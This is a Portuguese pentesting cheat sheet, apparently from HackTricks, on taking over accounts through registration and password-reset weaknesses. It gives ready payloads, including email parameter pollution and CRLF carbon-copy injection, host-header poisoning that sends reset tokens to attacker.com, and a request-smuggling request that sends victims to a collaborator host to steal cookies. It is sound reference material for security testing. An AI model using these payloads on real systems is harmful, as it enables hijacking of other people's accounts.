# Vulnerabilidades de Registro e Assunção de Conta

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Assunção de Conta

### Registro Duplicado

* Tente gerar um usuário usando um nome de usuário existente
* Verifique a variação do e-mail:
  * maiúsculas
  * \+1@
  * adicione algo no e-mail
  * caracteres especiais no nome do e-mail (%00, %09, %20)
  * Coloque caracteres em branco após o e-mail: `test@test.com a`
  * vítima@gmail.com@atacante.com
  * vítima@atacante.com@gmail.com

### Enumeração de Nome de Usuário

Verifique se é possível descobrir quando um nome de usuário já foi registrado dentro do aplicativo.

### Política de Senha

Ao criar um usuário, verifique a política de senha (verifique se é possível usar senhas fracas).\
Nesse caso, você pode tentar forçar credenciais.

### Injeção de SQL

[**Verifique esta página**](sql-injection/#insert-statement) para aprender como tentar assumir contas ou extrair informações por meio de **Injeções de SQL** em formulários de registro.

### Assunção de Conta Oauth

{% content-ref url="oauth-to-account-takeover.md" %}
[oauth-to-account-takeover.md](oauth-to-account-takeover.md)
{% endcontent-ref %}

### Vulnerabilidades SAML

{% content-ref url="saml-attacks/" %}
[saml-attacks](saml-attacks/)
{% endcontent-ref %}

### Alteração de E-mail

Ao se registrar, tente alterar o e-mail e verifique se essa alteração é validada corretamente ou se pode ser alterada para e-mails arbitrários.

### Mais Verificações

* Verifique se é possível usar **e-mails descartáveis**
* Senha **longa** (>200) leva a **DoS**
* **Verifique os limites de taxa na criação de contas**
* Use username@**burp\_collab**.net e analise o **callback**

## **Assunção de Conta por Redefinição de Senha**

### Vazamento de Token de Redefinição de Senha Via Referenciador <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Solicite a redefinição de senha para o seu endereço de e-mail
2. Clique no link de redefinição de senha
3. Não altere a senha
4. Clique em qualquer site de terceiros (por exemplo: Facebook, Twitter)
5. Interceptar a solicitação no proxy do Burp Suite
6. Verifique se o cabeçalho referer está vazando o token de redefinição de senha.

### Envenenamento de Redefinição de Senha <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Interceptar a solicitação de redefinição de senha no Burp Suite
2. Adicione ou edite os seguintes cabeçalhos no Burp Suite: `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Encaminhe a solicitação com o cabeçalho modificado\
   `http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Procure por uma URL de redefinição de senha com base no cabeçalho _host_ como: `https://attacker.com/reset-password.php?token=TOKEN`

### Redefinição de Senha Via Parâmetro de E-mail <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR em Parâmetros de API <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. O atacante deve fazer login em sua conta e acessar a opção **Alterar senha**.
2. Inicie o Burp Suite e intercepte a solicitação.
3. Envie-a para a guia de repetição e edite os parâmetros: ID do usuário/e-mail\
   `powershell POST /api/changepass [...] ("form": {"email":"vítima@email.com","password":"senhaSegura"})`

### Token de Redefinição de Senha Fraco <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

O token de redefinição de senha deve ser gerado aleatoriamente e ser único a cada vez.\
Tente determinar se o token expira ou se é sempre o mesmo, em alguns casos o algoritmo de geração é fraco e pode ser adivinhado. As seguintes variáveis podem ser usadas pelo algoritmo.

* Timestamp
* ID do usuário
* E-mail do usuário
* Nome e sobrenome
* Data de nascimento
* Criptografia
* Apenas números
* Pequena sequência de token (caracteres entre \[A-Z,a-z,0-9])
* Reutilização de token
* Data de expiração do token

### Vazamento de Token de Redefinição de Senha <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Acione uma solicitação de redefinição de senha usando a API/UI para um e-mail específico, por exemplo: test@mail.com
2. Inspecione a resposta do servidor e verifique se há `resetToken`
3. Em seguida, use o token em uma URL como `https://example.com/v3/user/password/reset?resetToken=[O_TOKEN_DE_REDEFINIÇÃO]&email=[O_EMAIL]`

### Redefinição de Senha Via Colisão de Nome de Usuário <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Registre-se no sistema com um nome de usuário idêntico ao nome de usuário da vítima, mas com espaços em branco inseridos antes e/ou depois do nome de usuário. por exemplo: `"admin "`
2. Solicite uma redefinição de senha com seu nome de usuário malicioso.
3. Use o token enviado para seu e-mail e redefina a senha da vítima.
4. Conecte-se à conta da vítima com a nova senha.

A plataforma CTFd estava vulnerável a esse ataque.\
Veja: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Assumir Conta Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Encontre um XSS dentro do aplicativo ou de um subdomínio se os cookies estiverem limitados ao domínio pai: `*.domain.com`
2. Vaze o cookie de **sessões** atual
3. Autentique-se como o usuário usando o cookie

### Assumir Conta Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1\. Use o **smuggler** para detectar o tipo de HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2\. Crie uma solicitação que sobrescreva o `POST / HTTP/1.1` com os seguintes dados:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` com o objetivo de redirecionar as vítimas para burpcollab e roubar seus cookies\
3\. A solicitação final pode parecer com a seguinte:
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Relatórios do Hackerone explorando esse bug\
\* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
\* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Assumir Conta via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Crie um payload para o CSRF, por exemplo: "Formulário HTML com envio automático para alteração de senha"
2. Envie o payload

### Assumir Conta via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

O JSON Web Token pode ser usado para autenticar um usuário.

* Edite o JWT com outro ID de usuário / Email
* Verifique a assinatura fraca do JWT

{% content-ref url="hacking-jwt-json-web-tokens.md" %}
[hacking-jwt-json-web-tokens.md](hacking-jwt-json-web-tokens.md)
{% endcontent-ref %}

## Referências

* [https://salmonsec.com/cheatsheet/account\_takeover](https://salmonsec.com/cheatsheet/account\_takeover)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
